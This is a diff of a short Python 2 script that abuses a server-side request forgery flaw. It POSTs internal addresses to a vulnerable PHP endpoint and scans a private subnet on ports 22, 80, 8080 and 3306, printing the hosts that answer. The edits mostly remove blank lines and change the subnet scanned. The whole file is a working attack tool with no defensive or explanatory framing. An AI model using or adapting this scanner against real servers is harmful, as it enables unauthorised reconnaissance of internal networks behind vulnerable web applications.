@@ -2,8 +2,6 @@
 import urllib,urllib2
 import threading,Queue,time
 
-
-
 q = Queue.Queue()
 lock = threading.Lock()
 def get_server(url,data=None):
@@ -11,7 +9,6 @@ def get_server(url,data=None):
     data ={'url':'http://'+data}
     values= urllib.urlencode(data)
     try:
-        
         req=urllib2.urlopen(url, data=values, timeout=5)
         html=req.read()
         code =req.code
@@ -19,10 +16,7 @@ def get_server(url,data=None):
         return code,html,length
     except:
         return code,html,length
-
 #print get_server("http://localhost/ssrf/ssrf.php", "127.0.0.1:3306")
-
-
 
 def run():
     while q.qsize()>0:
@@ -37,21 +31,13 @@ def run():
             lock.acquire()
             print ip
             lock.release()
-            
-            
     q.all_tasks_done
     
-    
-
-
-
-ip="192.168.0."
+ip="192.168.31."
 for i in range(1,255):
     for port in [22,80,8080,3306]:
         iport = ip+str(i)+":"+str(port)
         q.put(iport)
-
-
 
 for i in range(10):
     t = threading.Thread(target=run)
